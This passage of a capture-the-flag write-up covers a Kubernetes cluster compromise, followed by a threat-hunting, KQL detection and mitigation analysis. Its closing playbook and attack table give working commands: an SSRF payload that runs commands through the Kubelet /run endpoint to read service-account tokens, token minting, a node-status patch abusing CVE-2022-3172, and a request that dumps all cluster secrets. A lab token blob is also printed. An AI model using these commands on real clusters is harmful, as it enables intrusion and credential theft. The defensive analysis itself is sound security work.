U5Qk5IVW5jbmdkdkVqMHhCUHFHa2NWM1MwYzR6bjBYWmkwVGdYeDJCWWo5SW5OMVhXbDNzYzIxREtuRE5CcWEyQ0htQkxsaUdOT01vUmwtZjJ2MzRlNFVmVVdaSVBzdktrVDAwbkVMWU81OTRIV3l0M19kMl9mOHJlRVR5d3JzNnZ4WXNzTVYyQVUwSnpWM2VaYVYzRXJ3SGxnYkt4dlc3VmI5dVBsX3FyWWJYa1pyWGRwU2JjcEJ4ejNmT0c2OTkwRmRTSmwzWmI2LUo0V1hlOTFfMGF6cTZvY3VHSEh0SFpRczdzVGdzLUs3U29R"
      },
      "type": "kubernetes.io/service-account-token"
    }
  ]
* Connection #0 to host 172.30.0.2 left intact
}root@test:~#
```


![Wiz](wiz_flagbase64.png)

![Wiz](wiz_flag.png)

![Wiz](wiz_done_s.png)

![Wiz](wiz_Cert.png)

[Certificate](https://ctf-certificate-bucket.s3.amazonaws.com/static/certificates/cloudchampions/e71d9611-1eb0-427c-ad97-5c1233f40487.png))
![Wiz](wiz_Cert.png)


![Facts](htb_facts_Admin_facts_addd.png))

**Flag captured**


# Defensive Operations


## Strategic Overview

  * **1.1 Definition:** A multi-stage Kubernetes cluster compromise originating from an unauthenticated Server-Side Request Forgery (SSRF) in a custom internal proxy, leading to identity theft, Role-Based Access Control (RBAC) abuse, and exploitation of CVE-2022-3172.
  * **1.2 Impact:** Total cluster compromise (Cluster-Admin equivalent). The adversary achieved the ability to exfiltrate all secrets across all namespaces, including `kube-system`.
  * **1.3 The Scenario:** The threat actor gained initial access via a restricted staging pod. By reverse-engineering an internal Open Container Initiative (OCI) image without a runtime container (`oras` + `jq`), they identified a vulnerable custom proxy (`k8s-debug-bridge`). The actor exploited this SSRF to execute commands on the Kubelet API, stole a local service account token, minted a new highly privileged token, and manipulated the cluster's Node status to trick the Kubernetes API server into dumping all cluster secrets.



## System Architecture & Theory

  * **2.1 Protocol Environment:** Kubernetes (k3s distribution), OCI Container Registries, RESTful APIs, HTTP/HTTPS, JWT Authentication.
  * **2.2 Attack Logic Flow:**

> [Initial Pod Access] -\> [OCI Registry Enumeration] -\> [SSRF in Custom Proxy] -\> [Kubelet RCE via `/run`] -\> [Identity Pivot (Token Theft)] -\> [RBAC Token Minting] -\> [Node Status Manipulation (CVE-2022-3172)] -\> [Cluster Secret Exfiltration]

  * **2.3 Theoretical Analogy:** An intruder discovers an unsecured internal mail tube (the proxy SSRF), uses it to steal an employee's ID (Kubelet RCE), and leverages that ID's hidden HR permissions to forge a master administrator badge (RBAC Token Minting). The intruder then updates the building's directory to list their own desk as the central vault (Node Status Patch), causing the automated security system to deliver all vault contents directly to them (CVE-2022-3172).



## Attack Vector (Mechanics)

### Core Mechanism

| Attribute                  | Technical Details                                                                                                                                                                                                                                                                                                                                                                                                 |
| :------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Primary Identifiers**    | `k8s-debug-bridge`, `/checkpoint` endpoint, Kubelet Port `10250`, API Server Port `6443`, `nodes/proxy`, `nodes/status`.                                                                                                                                                                                                                                                                                          |
| **Critical Vulnerability** | 1. Improper input validation leading to **SSRF via URL fragment truncation (`#`)**.<br><br>2. **CVE-2022-3172** — API Server proxy abuse allowing requests to untrusted Kubelet endpoints.                                                                                                                                                                                                                        |
| **Offensive Action**       | Injected payload `172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets...#` into the `node_ip` parameter. The `#` truncated the backend path, redirecting execution to the Kubelet `/run` endpoint for RCE. Subsequently patched `nodes/noder/status` to change the Kubelet port to `6443`, forcing the API server to proxy requests to itself via `nodes/proxy`, enabling full secret extraction. |


### Prerequisites

  * **Access Level:** Initial access requires only execution rights within any non-privileged cluster pod.
  * **Connectivity:** Internal routing to the Kubelet API (`10250`) and Kubernetes API Server (`6443` or `443`).
  * **Target State:** A custom proxy application lacking URL sanitization; a Kubernetes cluster version vulnerable to CVE-2022-3172; and an over-privileged service account (`app`) with `create secrets` permissions.



## Threat Hunting & Anomaly Analysis

  * **Hunt Hypothesis:** Adversaries are bypassing standard Kubernetes API server audit logs by interacting directly with the Kubelet API (`10250`) to execute commands, and subsequently altering Node configurations to abuse the API Server's proxy mechanism.
  * **Behavioral Outliers:** \* `curl` or `wget` commands executing from within non-administrative pods targeting internal node IPs on port `10250`.
      * A backend web application proxying traffic to the Kubelet `/run` or `/exec` endpoints instead of standard `/logs` or `/metrics` endpoints.
      * Unexpected creation of a `kubernetes.io/service-account-token` type Secret in modern Kubernetes versions (v1.24+), where these are no longer auto-generated.
  * **Toxic Combinations:** The combination of a Service Account possessing `create` permissions on `secrets` mapped alongside a dormant, unmonitored Service Account possessing `patch` on `nodes/status` and `get` on `nodes/proxy`. This chain enables trivial privilege escalation to cluster-admin.



## Detection Engineering

  * **Telemetry Gap Analysis:** \* **Kubernetes Audit Logs:** Required to detect `PATCH` requests to `nodes/status` and anomalous `GET` requests to `nodes/proxy`.

      * **Container Runtime Logs:** Required to detect unexpected `exec` sessions (e.g., `cat /var/run/secrets/...`) invoked via the Kubelet API.
      * **Network Flow Logs:** Required to detect pod-to-kubelet internal traffic anomalies.

  * **Detection-as-Code (KQL):**

<!-- end list -->

```kql
// Detect anomalous patching of Node Status Kubelet Port (CVE-2022-3172 indicator)
let SuspiciousPorts = dynamic([6443, 443]);
KubernetesAudit
| where Stage == "ResponseComplete"
| where Verb == "patch"
| where ObjectRef_Resource == "nodes"
| where ObjectRef_Subresource == "status"
| extend RequestBody = parse_json(RequestBody)
| extend KubeletPort = toint(RequestBody.status.daemonEndpoints.kubeletEndpoint.Port)
| where KubeletPort in (SuspiciousPorts)
| project TimeGenerated, SourceIpAddress, User_Username, ObjectRef_Name, KubeletPort, UserAgent
```

  * **Resilience Test:** An adversary may attempt to bypass this by routing the exploit through an alternative port or using a proxy sidecar to mask the API Server manipulation.
  * **Sub-Rule:** Create an alert for any `GET` request targeting `nodes/*/proxy/api/v1/secrets` originating from non-administrative Service Accounts, regardless of the port specified in the node status.



## Toolkit & Implementation

  * **Automation:** Native Linux binaries (`curl`, `tar`, `grep`), `oras` (OCI Registry As Storage), `jq` (JSON parsing), and native `kubectl`.
  * **OPSEC Analysis:** The attacker utilized `oras` to pull image layers manually, avoiding Docker/containerd daemon logs. By exploiting the SSRF to interact directly with the Kubelet API, the initial RCE completely bypassed the central Kubernetes API Server audit logs. Commands were passed natively via URL parameters, leaving zero footprint on the target pod's filesystem.
  * **Post-Exploitation:** Base64 decoding of `kube-system` secrets. Potential for further lateral movement using extracted database credentials (Argon2 hashes) or generating persistent `cluster-admin` tokens.



## Defensive Mitigation

  * **Technical Hardening:**
      * **Patching:** Upgrade the Kubernetes cluster to a version where CVE-2022-3172 is remediated (API server proxy port validation).
      * **RBAC Review:** Remove `patch` permissions on `nodes/status` for all service accounts. Remove `create` permissions on `secrets` for frontend web application service accounts.
      * **Network Policies:** Implement strictly default-deny Network Policies. Pods should explicitly not be permitted to route traffic to the Kubelet API port (`10250`) on the worker nodes.
  * **Personnel Focus:** Enforce strict secure coding practices for internal Go applications. Developers must utilize native Kubernetes Client-Go libraries instead of concatenating raw user input (`fmt.Sprintf`) into internal API requests.



## Quick-Action Playbook

|  Step  | Objective                                    | Technical Command / Logic                                                                                                                                                   |
| :----: | :------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **01** | **Enumerate Registry**                       | `oras copy hustlehub.azurecr.io/k8s-debug-bridge:latest --to-oci-layout ./`                                                                                                 |
| **02** | **Exploit SSRF → RCE**                       | `curl -s http://k8s-debug-bridge.app/checkpoint -d '{"node_ip":"172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#"}'` |
| **03** | **Persist via Token Minting**                | `kubectl apply -f secret.yml` (with `kubernetes.io/service-account.name: k8s-debug-bridge`)                                                                                 |
| **04** | **Exploit API Server Proxy (CVE-2022-3172)** | `curl -X PATCH -d '{"status":{"daemonEndpoints":{"kubeletEndpoint":{"Port":6443}}}}' https://172.30.0.2:6443/api/v1/nodes/noder/status`                                     |
| **05** | **Exfiltrate Cluster Secrets**               | `curl https://172.30.0.2:6443/api/v1/nodes/noder/proxy/api/v1/secrets`                                                                                                      |
